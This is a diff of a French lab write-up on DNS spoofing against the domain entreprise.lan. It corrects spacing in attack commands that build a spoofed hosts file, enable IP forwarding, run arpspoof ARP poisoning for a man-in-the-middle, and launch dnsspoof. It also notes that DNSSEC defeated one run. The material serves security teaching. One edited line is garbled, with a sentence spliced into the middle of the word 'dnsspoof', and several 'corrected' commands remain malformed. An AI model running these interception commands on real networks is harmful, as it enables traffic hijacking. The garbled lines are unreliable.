@@ -685,7 +685,7 @@ But : faire résoudre **entreprise.lan** vers **192.31.25.14** (machine attaquan
 ### 1. Configuration du fichier de spoof DNS
 
 
-echo"192.31.25.14 entreprise.lan" |sudotee /etc/hosts_spoof
+echo "192.31.25.14 entreprise.lan" | sudotee /etc/hosts_spoof
 
 
 ---
@@ -693,7 +693,7 @@ echo"192.31.25.14 entreprise.lan" |sudotee /etc/hosts_spoof
 ### 2. Activation de l’IP forwarding
 
 
-sudo sysctl-w net.ipv4.ip_forward=1
+sudo sysctl -w net.ipv4.ip_forward=1
 
 
 ---
@@ -711,7 +711,7 @@ sudo arpspoof-i eth0 -t 192.31.25.12 192.31.25.15
 ### 4. Lancement de dnsspoof
 
 
-sudo dnsspoof -i eth0-f /etc/hosts_spoof
+sudo dnsspoof -i eth0 -f /etc/hosts_spoof
 
 
 ---
@@ -740,7 +740,7 @@ Le serveur DNS (192.31.25.12) utilise **DNSSEC**, ce qui implique :
 - publication des clés (`DNSKEY`)  
 - validation de la chaîne de confiance  
 
-Les réponses envoyées par `dnsspoof` étant non signées :
+Les réponses envoyées par `dnDNSSEC protège efficacement contre l’injection de réponses DNS falsifiées.sspoof` étant non signées :
 
 - elles sont rejetées par le résolveur  
 - elles sont ignorées au profit des réponses légitimes  
@@ -758,7 +758,7 @@ L’attaque échoue dans cet environnement car :
 - les réponses falsifiées ne sont pas authentifiées  
 - le client rejette les données non conformes  
 
-Le mécanisme DNSSEC protège efficacement contre ce type d’attaque.
+DNSSEC protège efficacement contre l’injection de réponses DNS falsifiées.
 
 ---
 
@@ -785,7 +785,7 @@ Réaliser une attaque DNS Spoofing afin de rediriger le trafic DNS d’une victi
 ### 1. Activation du routage IP
 
 
-sudo sysctl-w net.ipv4.ip_forward=1
+sudo sysctl -w net.ipv4.ip_forward=1
 
 
 ---
@@ -793,9 +793,9 @@ sudo sysctl-w net.ipv4.ip_forward=1
 ### 2. Empoisonnement ARP (MITM)
 
 
-sudo arpspoof-i eth0-t192.31.25.15192.31.25.12
+sudo arpspoof-i eth0 -t192.31.25.15 192.31.25.12
 
-sudo arpspoof-i eth0-t192.31.25.12192.31.25.15
+sudo arpspoof-i eth0 -t192.31.25.12 192.31.25.15
 
 
 ---
@@ -813,7 +813,7 @@ sudo nano /etc/dnsspoof_hosts
 ### 4. Lancement de dnsspoof
 
 
-sudo dnsspoof-i eth0-f /etc/dnsspoof_hosts
+sudo dnsspoof-i eth0 -f /etc/dnsspoof_hosts
 
 
 ---
